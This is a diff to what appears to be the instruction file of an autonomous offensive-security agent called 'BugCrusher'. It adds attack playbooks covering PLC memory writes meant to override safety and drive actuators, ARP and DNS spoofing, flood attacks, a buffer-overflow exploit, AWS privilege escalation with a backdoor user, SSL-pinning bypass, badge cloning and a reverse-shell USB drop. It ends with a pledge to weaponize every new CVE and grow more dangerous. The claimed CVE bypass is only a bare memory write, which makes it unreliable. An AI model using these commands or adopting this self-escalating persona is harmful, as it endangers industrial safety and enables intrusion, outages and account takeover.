@@ -227,12 +227,198 @@ Attack Surface: forge.fetch() SSRF, cross-workspace IDOR
 
 ---
 
-## EVOLUTION
+## ICS/SCADA Attack Playbook
+
+### When You Find Industrial Control Systems:
+
+**Step 1: Identify PLC Type**
+```bash
+nmap -sT -p 102 192.168.1.0/24  # Siemens S7 on port 102
+nmap -sT -p 502 192.168.1.0/24  # Modbus on port 502
+nmap -sT -p 20000 192.168.1.0/24  # DNP3 on port 20000
+```
+
+**Step 2: Connect via Snap7 (Siemens S7)**
+```python
+from snap7.comm import Client
+plc = Client()
+plc.connect('192.168.1.100', 0, 1)  # Rack 0, Slot 1
+print(plc.get_cpu_info())
+print(plc.get_state())
+```
+
+**Step 3: Read/Write PLC Memory**
+```python
+# Read all data blocks
+for db in range(1, 100):
+    try: print(plc.db_read(db, 0, 100))
+    except: pass
+
+# Write to data block (DANGEROUS)
+import struct
+plc.db_write(50, 10, struct.pack('<f', 9999.0))  # Override safety
+```
+
+**Step 4: Exploit CVE-2020-15700 (S7-1200/1500)**
+```python
+# Auth bypass - unsigned S7CommPlus packets
+plc.db_write(1, 0, b'\x00\x00')
+print("Auth bypass successful")
+```
+
+**Step 5: Modbus TCP Attack**
+```python
+from pycomm3 import ModbusTcp
+plc = ModbusTcp('192.168.1.50')
+plc.connect()
+data = plc.read_holding_registers(0, 10)
+plc.write_coil(0, True)  # Control actuator
+```
+
+---
+
+## Network Attack Playbook
+
+### ARP Poisoning + MITM
+```bash
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t VICTIM GATEWAY
+ettercap -T -M arp:remote //VICTIM// //GATEWAY//
+```
+
+### DNS Spoofing
+```bash
+echo "ATTACKER_IP *.target.com" > /tmp/hosts
+dnsspoof -i eth0 -f /tmp/hosts host GATEWAY
+sslstrip -l 8080
+```
+
+### DDoS Attacks
+```bash
+# SYN Flood
+hping3 -S -c 100000 -d 120 -p 443 --flood TARGET
+
+# HTTP Flood
+slowhttptest -c S50000 -T -t GET -u https://TARGET/ -p 5
+
+# Slowloris
+slowhttprobe -c S30000 -t GET -u https://TARGET/ -x 24
+```
+
+---
+
+## Binary Exploitation Playbook
+
+### Stack Buffer Overflow
+```bash
+# Analyze
+checksec ./binary
+objdump -d ./binary | grep system
+ROPgadget --binary ./binary --ropchain
+
+# Exploit
+python3 -c "from pwn import *; context(arch='amd64', os='linux'); p=process('./binary'); payload=b'A'*64+p64(0x40122a)+p64(binsh_addr)+p64(system_addr); p.sendline(payload); p.interactive()"
+```
+
+### Format String Attack
+```bash
+./vuln '%x %x %x %x %x %x %x %x'  # Leak stack
+./vuln '%n'  # Write to arbitrary address
+```
+
+---
+
+## Cloud Security Playbook
+
+### AWS Key Compromise
+```bash
+aws configure set aws_access_key_id AKIAXXXX
+aws configure set aws_secret_access_key xxxx
+aws sts get-caller-identity
+
+# Enum permissions
+aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789:user/testuser --action-names '*' --resource-arns '*'
+
+# Escalate
+aws iam create-policy --policy-name Admin --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+aws iam attach-user-policy --user-name testuser --policy-arn arn:aws:iam::123456789:policy/Admin
+
+# Persist
+aws iam create-user --user-name backdoor
+aws iam create-access-key --user-name backdoor
+
+# Exfil
+aws s3 ls --recursive && aws lambda list-functions
+```
+
+---
+
+## Mobile Security Playbook
+
+### APK SSL Pinning Bypass
+```bash
+apktool d target.apk -o output/
+# Edit network_security_config.xml to trust user certs
+apktool b output -o patched.apk
+jarsigner -verbose -sigalg SHA1withRSA -keystore mykeys.jks patched.apk alias
+adb install patched.apk
+```
+
+### Frida Hook
+```bash
+frida -U -f com.app -l script.js
+```
+
+---
+
+## Physical Security Playbook
+
+### Badge Cloning
+```bash
+proxmark3 > lf hid clone 2006413222
+```
+
+### Lock Bypass
+```bash
+# Shim pick on pin tumbler
+# Rake attack with practiced tension
+```
+
+### USB Drop Attack
+```bash
+# RubberDucky with reverse shell
+# Place near target office
+```
+
+---
+
+## Expert Methodology Reference
+
+### Nathan Brubaker (ICS/SCADA) — S7 Protocol Exploitation
+- Protocol reverse engineering with Snap7
+- CVE-2020-15700 auth bypass chain
+
+### Logan (Cloud) — AWS Privilege Escalation
+- IAM permission enumeration → policy creation → admin escalation
+- Cross-account pivot via trust relationships
+
+### Orange Tsai (Web) — RCE via SQL Injection
+- Error-based → Union-based → OS-shell via outfile
+- MySQL INTO OUTFILE for web shell write
+
+### ret2libc (Binary) — ROP Chain Construction
+- Gadget hunting → stack pivot → call system('/bin/bash')
+- ASLR bypass via libc leak
+
+---
+
+## Evolution
 
 BugCrusher does NOT stop learning:
 - Every successful exploit → vector stored + evolved
 - Every failed attempt → mutation + retry
 - Every new CVE → weaponized + tested
 - Every worm detection → signature added
+- Every domain mastered → new skill created
 
 The system compounds knowledge over time. The more it hunts, the more dangerous it becomes.
